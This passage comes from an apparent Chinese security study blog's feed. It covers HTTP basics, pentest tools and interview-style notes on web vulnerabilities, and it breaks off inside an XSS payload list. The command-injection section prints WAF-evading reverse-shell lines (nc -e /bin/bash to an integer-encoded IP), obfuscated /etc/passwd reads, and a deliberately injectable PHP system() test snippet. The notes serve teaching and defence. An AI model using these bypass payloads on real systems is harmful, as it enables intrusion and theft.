JSP          | Oracle     | 1521       |</p></li></ul><h1 id="URL-与-URL-编码"><a href="#URL-与-URL-编码" class="headerlink" title="URL 与 URL 编码"></a>URL 与 URL 编码</h1><ul><li>URL简介</li></ul><p>统一资源定位符（Uniform Resource Locator，常缩写为URL），有时也被俗称为网页地址（网址）。<br>![url格式]</p><p><code>协议类型:[//服务器地址[:端口号]][/资源层级UNIX文件路径]文件名[?查询][#片段ID]</code><br>下是常⻅的 URL 编码字符：</p><table><thead><tr><th>字符</th><th>URL编码</th></tr></thead><tbody><tr><td>=</td><td>%3d</td></tr><tr><td>#</td><td>%23</td></tr><tr><td>%</td><td>%25</td></tr><tr><td>&amp;</td><td>%26</td></tr><tr><td>/</td><td>%2f</td></tr><tr><td>空格</td><td>%20</td></tr><tr><td>换行</td><td>%0a</td></tr><tr><td>空字节</td><td>%00</td></tr></tbody></table><p>另一个值得注意的编码字符是加号（+），它也可以代表 URL 编码的空格。</p><p><strong><code>浏览器发送数据时自动对url进行编码</code></strong></p><h1 id="HTTP-协议报文"><a href="#HTTP-协议报文" class="headerlink" title="HTTP 协议报文"></a>HTTP 协议报文</h1><p>HTTP（HyperText Transfer Protocol）既超文本传输协议，是一种详细规定了浏览器和万维网服务器之间互相通信的规则。</p><h2 id="http协议简介"><a href="#http协议简介" class="headerlink" title="http协议简介"></a>http协议简介</h2><p>HTTP协议它遵循请求(Request)/应答(Response)模型，浏览器向服务器发送请求时，Web服务器处理请求并返回适当的应答。所以在发送一次HTTP请求会产生两类报文，分别是<code>请求报文</code>与<code>响应报文</code>。它也是一种<code>无状态的协议</code>。</p><p><img src="http://qiniuyun.lintstar.top/image-20200722141022080.png" alt="image-20200722141022080"></p><p>无状态意味着当一个客户端向服务器端发送<code>请求</code>，然后Web服务器返回<code>响应</code>(Response)，<code>连接</code>就被<code>关闭</code>了。在服务器端不保留连接的有关信息。也就是说，<code>HTTP请求只能由客户端发起</code></p><h2 id="HTTP-请求报文"><a href="#HTTP-请求报文" class="headerlink" title="HTTP 请求报文"></a>HTTP 请求报文</h2><p>HTTP 请求报文由请求行、请求头部、空行和请求数据4个部分组成</p><p><img src="http://qiniuyun.lintstar.top/image-20200722141204179.png" alt="image-20200722141204179"></p><h2 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h2><p><img src="http://qiniuyun.lintstar.top/image-20200722141257869.png" alt="image-20200722141257869"></p><p>HTTP 协议的请求方法有GET、POST、HEAD、PUT、DELETE、OPTIONS、TRACE、CONNECT。</p><h3 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h3><p>GET 是最常用的方法。通常用于请求服务器发送某个资源。 在 GET 请求中，查询字符串是在 URL 中发送的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?r=default/news/content&amp;id=1</span><br></pre></td></tr></table></figure><blockquote><p><code>URL 是存在⻓度限制的，所以 GET 请求所传递的数据是有限的</code></p></blockquote><h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>在 POST 请求中，查询字符串是在 POST 请求的 请求正文中发送的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=123&amp;word=123&amp;cooktime=0&amp;checkcode=7926</span><br></pre></td></tr></table></figure><blockquote><p><code>POST 请求的数据是没有大小限制的</code></p></blockquote><h3 id="HEAD请求"><a href="#HEAD请求" class="headerlink" title="HEAD请求"></a>HEAD请求</h3><p>HEAD 方法与 GET 方法的行为很类似，但服务器在响应中只返回首部，不会返回实体的主体部分。所以速度比GET快。通过查看响应中的状态码，看看某个对象是否存在。</p><p><img src="http://qiniuyun.lintstar.top/image-20200722142234782.png" alt="image-20200722142234782"></p><blockquote><p><code>扫描器经常使用HEAD方法。</code></p></blockquote><h3 id="PUT请求"><a href="#PUT请求" class="headerlink" title="PUT请求"></a>PUT请求</h3><p>与 GET 从服务器读取文档相反，PUT 方法会向<code>服务器写入文档。</code>如果文件已经存在，则覆盖。</p><p><img src="http://qiniuyun.lintstar.top/image-20200722142956707.png" alt="image-20200722142956707"></p><blockquote><p><code>IIS6 PUT 漏洞</code></p></blockquote><h3 id="DELETE请求"><a href="#DELETE请求" class="headerlink" title="DELETE请求"></a>DELETE请求</h3><p>DELETE 方法所做的事情就是<code>请服务器删除请求 URL 所指定的资源</code></p><p><img src="http://qiniuyun.lintstar.top/image-20200722143158567.png" alt="image-20200722143158567"></p><h3 id="OPTIONS请求"><a href="#OPTIONS请求" class="headerlink" title="OPTIONS请求"></a>OPTIONS请求</h3><p>OPTIONS 方法请求 Web 服务器告知其支持的各种功能。可以<code>询问服务器通常支持哪些方法</code>，或者对某些特殊资源支持哪些方法。</p><p><img src="http://qiniuyun.lintstar.top/image-20200722143452214.png" alt="image-20200722143452214"></p><h3 id="拓展方法"><a href="#拓展方法" class="headerlink" title="拓展方法"></a>拓展方法</h3><p>扩展方法 指的就是没有在 HTTP/1.1 规范中定义的方法。服务器会为它所管理的资源实现一 些 HTTP 服务，这些方法为开发者提供了一种扩展这些 HTTP 服务能力的手段。</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>LOCK</td><td>允许用户“锁定”资源——比如，可以在编辑某个资源的时候将其锁定，以防别人同时对其进行修改。</td></tr><tr><td>MKCOL</td><td>允许用户创建资源</td></tr><tr><td>COPY</td><td>便于在服务器上复制资源MOVE在服务器上移动资源</td></tr></tbody></table><h2 id="请求头部"><a href="#请求头部" class="headerlink" title="请求头部"></a>请求头部</h2><p>请求头部用来告知服务器有关于客户端请求的信息，由关键字/值对组成，每行一对，关键字和值用英文冒号<code>:</code>分隔:</p><p><img src="http://qiniuyun.lintstar.top/image-20200722144254804.png" alt="image-20200722144254804"></p><p><a href="https://www.jianshu.com/p/a797e6eff804" target="_blank" rel="noopener"> 请求头部详解</a></p><h1 id="HTTP响应报文"><a href="#HTTP响应报文" class="headerlink" title="HTTP响应报文"></a>HTTP响应报文</h1><p>HTTP响应报文由状态行、消息报头、空行、响应正文4个部分组成：</p><p><img src="http://qiniuyun.lintstar.top/image-20200722144757800.png" alt="image-20200722144757800"></p><h2 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h2><p>状态行由HTTP协议版本、状态码和状态描述3个字段组成，它们用空格分隔。状态码是客户端理解事务处理结果的快捷方式。有以下类型组成:</p><table><thead><tr><th>状态码</th><th>描述</th></tr></thead><tbody><tr><td>1xx</td><td>指示信息–表示请求已接收，继续处理</td></tr><tr><td>2xx</td><td>成功–表示请求已被成功接收、理解、接受</td></tr><tr><td>3xx</td><td>重定向–要完成请求必须进行更进一步的操作</td></tr><tr><td>4xx</td><td>客户端错误–请求有语法错误或请求无法实现</td></tr><tr><td>5xx</td><td>服务器端错误–服务器未能实现合法的请求</td></tr></tbody></table><p>常⻅状态码描述：</p><table><thead><tr><th>状态码</th><th>原因</th><th>短语含义</th></tr></thead><tbody><tr><td>200</td><td>OK</td><td>客户端请求成功没有问题</td></tr><tr><td>302</td><td>Found</td><td>重定向，客户端应该使用 Location 首部给出的URL 来临时定位资源</td></tr><tr><td>304</td><td>Not Modified</td><td>直接使用本地缓存</td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求有语法错误，不能被服务器所理解</td></tr><tr><td>401</td><td>Unauthorized</td><td>请求未经授权认证</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器收到请求，但是拒绝提供服务访问一个网站目录常出现这种情况</td></tr><tr><td>404</td><td>Not Found</td><td>请求资源不存在</td></tr><tr><td>405</td><td>Method NotAllowed</td><td>发请求中带有所请求的方法不允许</td></tr><tr><td>500</td><td>InternalServer Error</td><td>服务器发生不可预期的错误</td></tr><tr><td>502</td><td>BadGateway</td><td>无法连接到其父网关</td></tr><tr><td>503</td><td>ServiceUnavailable</td><td>服务器当前不能处理客户端的请求</td></tr></tbody></table><h2 id="响应头部"><a href="#响应头部" class="headerlink" title="响应头部"></a>响应头部</h2><p>响应头部用来描述服务器信息的，由关键字/值对组成，每行一对，关键字和值用英文冒号<code>:</code>分隔:</p><p><img src="http://qiniuyun.lintstar.top/image-20200722145800864.png" alt="image-20200722145800864"></p><h2 id="响应正文"><a href="#响应正文" class="headerlink" title="响应正文"></a>响应正文</h2><p>响应正文会返回请求资源的源码信息，然后这些源码通过浏览器渲染就呈现出我们所看到的效果:</p><p><img src="http://qiniuyun.lintstar.top/image-20200722150031577.png" alt="image-20200722150031577"></p><h2 id="Http与Https"><a href="#Http与Https" class="headerlink" title="Http与Https"></a>Http与Https</h2><p>HTTP是不安全的，它具有许多安全⻛险：</p><ol><li>窃听⻛险：黑客可以获知通信内容。</li><li>篡改⻛险：黑客可以修改通信内容。</li><li>冒充⻛险：黑客可以冒充他人身份参与通信。</li></ol><ul><li>HTTPS（HyperText Transfer Protocol over Secure Socket Layer），它的基础是SLL/TLS，既在HTTP下加入 SSL/TLS层。</li><li>HTTPS通过安全传输机制进行传送数据，这种机制可以保护网络传送的所有数据的隐秘性与完整性</li></ul><h1 id="Cookie-与-Session-原理"><a href="#Cookie-与-Session-原理" class="headerlink" title="Cookie 与 Session 原理"></a>Cookie 与 Session 原理</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>  由 HTTP 协议是无连接无状态的，所以 HTTP 协议无法记住客户端的信息。为了弥补HTTP协议这两点的“不足”，所以出现了会话技术。一个是 Cookie，而另一个则是 Session。</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie 是由服务器端生成，服务器将数据通过 HTTP 响应存储到浏览器上，这就是 Cookie。浏览器可以在以后携带对应的 Cookie 数据访问服务器</p><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>Session 与浏览器无关，但是与 Cookie 有关。Session 是<code>以 Cookie 为基础</code>，将重要的数据保存在服务器端，同时将能够唯一表示这份数据的数据以 cookie 的形式保存在客户端。</p><p>第一次访问：</p><ol><li>创建SessionId</li><li>初始化超全局变量$_SESSION</li><li>在php指定目录创建以SESSIONId为名的文件</li><li>脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SessionID对应的文件中。并将SESSIONID以SETCOOKIE的形式返回给客户端</li></ol><p>第二次访问：</p><ol start="5"><li>检测到客户端的COOKIE中的SESSIONID</li><li>初始化超全局变量$_SESSION</li><li>找到文件，反序列化读取数据存储到$_SESSION中。</li><li>脚本执行结束，将$_SESSION中保存的所有数据序列化存储到SESSIONID对应的文件中。</li></ol><h2 id="web应用判断用户登录"><a href="#web应用判断用户登录" class="headerlink" title="web应用判断用户登录"></a>web应用判断用户登录</h2><ol><li><p>当用户提交的帐号密码正确后，服务端会使用SESSION将用户信息<code>存储到服务端</code>。并将SESSIONID以<code>SETCOOKIE</code>的形式<code>返回</code>给<code>客户端</code>。</p></li><li><p>当用户<code>第二次</code>访问站点时，会自动带上<code>COOKIE</code>信息，那么服务端会根据COOKIE中的SESSIONID进行<code>匹配数据</code>。如果<code>存在</code>数据，则说明已经<code>登录过</code>，为登录状态。如果<code>不存在</code>数据，则说明没有登录，为<code>未登录</code>状态</p></li></ol><h1 id="渗透测试环境与工具"><a href="#渗透测试环境与工具" class="headerlink" title="渗透测试环境与工具"></a>渗透测试环境与工具</h1><p><strong>工欲善其事，必先利其器</strong></p><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><ul><li>Windows 10<ul><li>优点：WSL、国产工具比较多</li><li>缺点：Docker 安装、游戏丰富多彩</li></ul></li><li>Linux（Ubuntu、Deepin、Kali）<ul><li>优点：国际工具兼容性好</li><li>缺点：exe 小工具无法运行、软件生态不好</li></ul></li><li>macOS<ul><li>优点：软件生态好、Uninx血统</li><li>缺点：国产小工具得开虚拟机</li></ul></li></ul><h2 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h2><h3 id="Chome"><a href="#Chome" class="headerlink" title="Chome"></a>Chome</h3><table><thead><tr><th>插件名</th><th>说明</th></tr></thead><tbody><tr><td>Charset</td><td>修改网站的默认编码</td></tr><tr><td>Fatkun</td><td>图片批量下载批量爬取下载图片神器</td></tr><tr><td>Link Grabber</td><td>批量提取网⻚链接</td></tr><tr><td>ProxySwitchyOmega</td><td>轻松快捷地管理和切换多个代理</td></tr><tr><td>Shodan</td><td>信息收集插件之端口探测</td></tr><tr><td>Tampermonkey</td><td>支持各种强大的插件</td></tr><tr><td>uBlacklist</td><td>禁止特定的网站显示在 Google的搜索结果中</td></tr><tr><td>Wappalyzer</td><td>网站指纹基础信息探测超级简单的自动刷新顾名思义，自动刷新</td></tr></tbody></table><h3 id="Fiefox"><a href="#Fiefox" class="headerlink" title="Fiefox"></a>Fiefox</h3><blockquote><p>完美适配Hackbar：<a href="https://wws.lanzous.com/iRZjdfc8mjg" target="_blank" rel="noopener">https://wws.lanzous.com/iRZjdfc8mjg</a></p></blockquote><table><thead><tr><th>插件名</th><th>说明</th></tr></thead><tbody><tr><td>ProxySwitchyOmega</td><td>轻松快捷地管理和切换多个代理</td></tr><tr><td>Hackbar</td><td>半自动化注入必备</td></tr></tbody></table><blockquote><p>Hackbar <a href="https://wws.lanzous.com/ilIDXfc8n2f" target="_blank" rel="noopener">https://wws.lanzous.com/ilIDXfc8n2f</a>             |</p></blockquote><h2 id="工具推荐"><a href="#工具推荐" class="headerlink" title="工具推荐"></a>工具推荐</h2><table><thead><tr><th>工具</th><th>说明</th></tr></thead><tbody><tr><td>AWVS 13</td><td>经典的自动化 Web 漏洞扫描神器</td></tr><tr><td>antSword</td><td>实用强大 Webshell 管理工具</td></tr><tr><td>antSwordBehinder</td><td>“冰蝎”动态二进制加密网站管理客户端</td></tr><tr><td>BurpSuite</td><td>渗透测试抓包改包必备</td></tr><tr><td>Cmder</td><td>Windows 下 Cmd 增强</td></tr><tr><td>Cobalt Strike</td><td>内网渗透代理神器</td></tr><tr><td>CSdirsearch</td><td>强大的目录扫描工具</td></tr><tr><td>dirsearch</td><td>sqlmapSQL 注入必备神器</td></tr><tr><td>Terminus</td><td>跨平台高颜值的终端</td></tr><tr><td>Typora</td><td>跨平台使用的 Markdown 编辑器</td></tr><tr><td>Metasploit</td><td>知名开源的漏洞攻击框架</td></tr><tr><td>mimikatz</td><td>读取已经登录过的用户Hash和明文密码</td></tr><tr><td>MobaXtermWindows</td><td>下好用的终端，支持多协议</td></tr><tr><td>NavicatPremium</td><td>强大的第三方数据库管理工具</td></tr><tr><td>Nmap</td><td>端口扫描必备工具</td></tr><tr><td>phpStudy 2018版</td><td>Windows 下经典的 PHP 环境搭建工具</td></tr><tr><td>WebRobot</td><td>比较好用的爬虫工具</td></tr><tr><td>VSCode</td><td>开源强大跨平台的编辑器</td></tr><tr><td>zenmap</td><td>Nmap 的官方图形化界面</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;渗透测试基础&quot;&gt;&lt;a href=&quot;#渗透测试基础&quot; class=&quot;headerlink&quot; title=&quot;渗透测试基础&quot;&gt;&lt;/a&gt;渗透测试基础&lt;/h1&gt;&lt;p&gt;渗透测试（Penetration Testing）是指&lt;strong&gt;受信任的第三方&lt;/strong&gt;通过&lt;
      
    
    </summary>
    
      <category term="渗透测试" scheme="https://winthorlimo.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Web" scheme="https://winthorlimo.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>安服问题</title>
    <link href="https://winthorlimo.github.io/note/2020/undefined30/6a2e2a4a.html"/>
    <id>https://winthorlimo.github.io/note/2020/undefined30/6a2e2a4a.html</id>
    <published>2020-06-30T11:09:05.000Z</published>
    <updated>2020-08-20T09:27:14.514Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试基本流程"><a href="#渗透测试基本流程" class="headerlink" title="渗透测试基本流程"></a>渗透测试基本流程</h2><p>1.信息收集</p><ul><li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li><li>网站指纹识别（包括，cms，cdn，证书等），dns记录</li><li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li><li>子域名收集，旁站查询(有授权可渗透)，C段等</li><li>google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</li><li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li><li>传输协议，通用漏洞，exp，github源码等</li></ul><p>2.漏洞挖掘</p><p>   XSS，SQL注入，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，使用漏扫工具等</p><p>3.漏洞利用|提权</p><p>   mysql提权，linux系统提权</p><p>4.编写报告|清除测试数据</p><p>5.漏洞复测</p><h2 id="sqlmap的运行机理"><a href="#sqlmap的运行机理" class="headerlink" title="sqlmap的运行机理"></a>sqlmap的运行机理</h2><ol><li><p>尝试连接目标网站</p></li><li><p>确认目标网站是否为动态网页</p></li><li><p>通过报错确认数据库的类型</p></li><li><p>添加payload进行测试</p></li><li><p>测试出注入类型后会对数据库版本进行猜测</p></li><li><p>最后的出结论</p></li></ol><h2 id="htaccess利用"><a href="#htaccess利用" class="headerlink" title=".htaccess利用"></a>.htaccess利用</h2><ul><li><p>htaccess是超文本访问（Hypertext Access）的缩写，是一个基于Apache的Web服务器使用的配置文件，用于控制它所在的目录以及该目录下的所有子目录。</p></li><li><p>.htaccess文件的主要功能包括使用密码保护文件夹，禁止或允许用户使用IP地址访问，禁止目录浏览，将用户自动重定向到另一个页面或目录，创建和使用自定义错误页面，改变具有特定扩展名的文件的使用方式，或者通过指定文件扩展名或特定文件作为主页。</p></li></ul><ol><li>用连续的弹出图片骚扰用户</li><li>可以上传图片马，将jpg文件解析为php文件</li></ol><h2 id="sql注入原理及防御"><a href="#sql注入原理及防御" class="headerlink" title="sql注入原理及防御"></a>sql注入原理及防御</h2><p>原理 ： 当网站在向后台数据库传递SQL语句进行数据库操作时。如果对用户输入的参数没有经过严格的过滤处理，那么恶意访问者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p><p>防御：</p><ol><li><p>关闭错误提示，php.ini中的display_errors=Off</p></li><li><p>魔术引号当php.ini里的magic_quotes_gpc=On时。提交的变量中所有的单引号（’）、双引号（”）、反斜线（/）与 NUL（NULL 字符）会自动转为含有反斜线的转义字符。</p></li><li><p>通过使用参数化查询和对象关系映射(Object Relational Mappers，ORM)，来避免和修复注入漏洞。此类查询通过指定参数的占位符，以便数据库始终将它们视为数据，而非SQL命令的一部分。</p></li><li><p>使用转义字符</p></li></ol><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>命令执行漏洞原理：<br>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p><p>命令执行漏洞利用条件：</p><ul><li>应用调用执行系统命令的函数</li><li>将用户输入作为系统命令的参数拼接到了命令行中</li><li><p>没有对用户输入进行过滤或过滤不严<br>漏洞分类：</p></li><li><p>代码层过滤不严</p><ul><li>商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：system(“/bin/program –arg $arg”);</li></ul></li><li><p>系统的漏洞造成命令注入</p><ul><li>bash破壳漏洞（CVE-2014-6271）</li></ul></li><li><p>调用的第三方组件存在代码执行漏洞</p><ul><li>如wordPress中用来处理图片的imageMagick组件<br>JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）<br>ThinkPHP命令执行</li></ul></li></ul><p>漏洞危害：</p><ul><li>继承Web服务程序的权限去执行系统命令或读写文件</li><li>反弹shell</li><li>控制整个网站甚至服务器</li><li>进一步内网渗透</li></ul><p>命令拼接符<br>|、||、&amp;、&amp;&amp;的区别：<br>&amp;：无论左边是false还是true，右边都执行<br>&amp;&amp;：具有短路效果，左边是false，右边不执行。<br>|:无论左边是false还是true，右边都会执行<br>||：具有短路效果，左边是true，右边不执行。</p><p>代码执行：</p><ul><li><p>利用系统函数实现命令执行，在php下，允许命令执行的函数有：<br>eval（）、assert（）、preg_replace（）、call_user_func（）<br>如果页面中存在这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞</p></li><li><p>其他函数<br>ob_start（）、unserialize（）、creat_function（）<br>、usort（）、uasort（）、uksort（）、<br>array_filter（）、<br>array_reduce（）、<br>array_map（）……</p></li></ul><p>系统命令执行漏洞</p><ul><li>system（）</li><li>exec（）</li><li>shell_exec（）</li><li>passthru（）</li><li>pcntl_exec（）</li><li>popen（）</li><li>proc_open（）</li><li>反引号<br>……</li></ul><p>命令执行WAF绕过技巧</p><ul><li>技巧一：通配符<br>ls-l<br>使用通配符<br>/?in/?s-l</li></ul><p>/???/??t /??c/p???w?<br>有时候WAF不允许使用太多的？号<br>/?in/cat/?tc/p?sswd</p><ul><li>NC反弹shell:<br>nc -e /bin/bash 127.0.0.1 3737<br>为了避免符号，可以将IP地址转换成整型。<br>127.0.0.1-&gt;2130706433</li></ul><p>使用通配符<br>root@kali:~#/??n/?c -e/??n/b??h 2130706433 3737</p><p>技巧二：连接符</p><p>技巧三：未初始化的bash变量<br>在bash环境中允许我们使用未初始化的bash变量，如何<br>$a ,$b,$c<br>我们事先并没有定义它们，输出看看:<br>root@kali:~# echo $a<br>root@kali:~# echo $b<br>root@kali:~# echo $c<br>root@kali:~#<br>未初始化的变量值都是null</p><p>读取/etc/passwd:<br>cat$a /etc$a/passwd$a</p><p>测试WAF<br>测试代码：<br>&lt;?php<br>echo “OK”;<br>system(‘dig’.$_GET[‘host’]);<br>?&gt;</p><p><a href="http://www.baidu.com;$s/bin$s/which$s" target="_blank" rel="noopener">www.baidu.com;$s/bin$s/which$s</a> nc$s<br>反弹shell:<br>/bin$s/nc$s -e/bin$s/bash$s 2130706433 3737</p><p>漏洞修复：</p><ul><li>尽量少用执行命令的函数或者直接禁用</li><li>参数值尽量使用引号包括</li><li>在使用动态函数之前，确保使用的函数是指定的函数之一</li><li>在进入执行命令的函数/方法之前，对参数进行过滤，对敏感字符进行转义</li><li>对PHP语言来说，不能完全控制的危险函数最好不要使用</li></ul><h2 id="XSS漏洞"><a href="#XSS漏洞" class="headerlink" title="XSS漏洞"></a>XSS漏洞</h2><p>​    恶意攻击者往Web页面里插入恶意javaScript代码，当用户浏览该页之时，嵌入其中Web里面的javaScript代码会被执行，从而达到恶意攻击用户的目的。</p><ul><li><p>反射型XSS：攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。</p></li><li><p>存储型XSS：代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie。</p></li><li><p>DOM性XSS：DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。</p></li></ul><p>防御：</p><ul><li>进行输入检查，限制输入允许的字符，让特殊字符的攻击失效。XSS Filter</li><li>开启HttpOnly，解决xss后的cookie劫持问题</li><li>进行输出过滤，所有需要输出到页面的元素全部通过HTMLEncode</li></ul><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。</p><p>防御：</p><ol><li><p>同源检测  禁止不受信任的域名对我们发起请求。</p><p>Origin Header</p><p>Referer Header</p></li><li><p>CSRF Token</p><p>a. 将CSRF Token输出到页面中</p><p>b. 页面提交的请求携带这个Token</p><p>c. 服务器验证Token是否正确</p></li><li><p>双重cookie验证</p><p>在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如<code>csrfcookie=v8g9e4ksfhw</code>）。</p><p>在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例<code>POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw</code>）。</p><p>后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。</p><p>任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间）</p></li><li><p>Samesite Cookie 属性</p></li></ol><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>通常用于控制web进而探测内网服务以及拥挤内网脆弱应用</p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。</p><p>利用：</p><ul><li><p>file协议查看文件</p></li><li><p>dict协议探测端口</p></li><li><p>gopher协力支持get&amp;post请求</p></li></ul><p>防御：</p><ul><li><p>限制协议为HTTP，HTTPS</p></li><li><p>设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</p></li><li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p></li><li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p></li></ul><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。</p><p>造成文件上传漏洞的原因有：</p><ul><li>开源编辑器的上传漏洞</li><li>服务器配置不当</li><li>本地文件上传限制被绕过</li><li>过滤不严或被绕过</li><li>文件解析漏洞导致文件执行</li><li>文件路径截断</li></ul><p>绕过：</p><ul><li><p>%00 截断绕过</p></li><li><p>文件名绕过 大小写绕过  php2 php3 php5 phtml</p></li><li><p>Content-Type绕过</p></li><li><p>前端js绕过</p><ol><li><code>Content-Type绕过</code></li><li><code>前端绕过</code></li><li><code>文件解析规则绕过</code></li><li><code>Windows环境特性绕过</code></li><li><code>文件名大小写绕过</code></li><li><code>双写绕过</code></li><li><code>点空格绕过</code></li><li><code>文件头绕过</code></li><li><code>条件竞争绕过</code></li></ol></li></ul><p>防御</p><ol><li>将文件上传的目录设置为不可执行</li><li>判断文件类型，结合使用MIME Type，后最检查等方式，推荐使用白名单方式</li><li>使用随机数改写文件名和文件路径。</li></ol><h3 id="常用web漏洞测试的payload整理"><a href="#常用web漏洞测试的payload整理" class="headerlink" title="常用web漏洞测试的payload整理"></a><strong>常用web漏洞测试的payload整理</strong></h3><p>[反射型xss]</p><ul><li>[在html形成]</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&apos;&gt;&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;document.title=&quot;[random]&quot;;&lt;/script&gt;</span><br><span class="line">&lt;svg οnlοad=document.title=&quot;[random]&quot;;&gt;</span><br></pre></td></tr></table></figure><ul><li>[在js形成]</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.title=&quot;[random]&quot;;//</span><br><span class="line">;document.title=&quot;[random]&quot;;//</span><br><span class="line">&quot;;document.title=&quot;[random]&quot;;</span><br><span class="line">&apos;;document.title=&quot;[random]&quot;;</span><br><span class="line">&quot;);document.title=&quot;[random]&quot;;</span><br><span class="line">&apos;);document.title=&quot;[random]&quot;;</span><br></pre></td></tr></table></figure><ul><li>[在html属性形成(img)]</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">888&quot; οnlοad=document.title=&quot;[random]&quot; a=&quot;</span><br><span class="line">888&apos; οnlοad=document.title=&quot;[random]&quot; a=&apos;</span><br><span class="line">888 οnlοad=document.title=&quot;[random]&quot;</span><br></pre></td></tr></table></figure><p>[存储型xss]</p><ul><li>[通用payload]<br>测试环境，需要在触发的地方查看payload显示情况</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 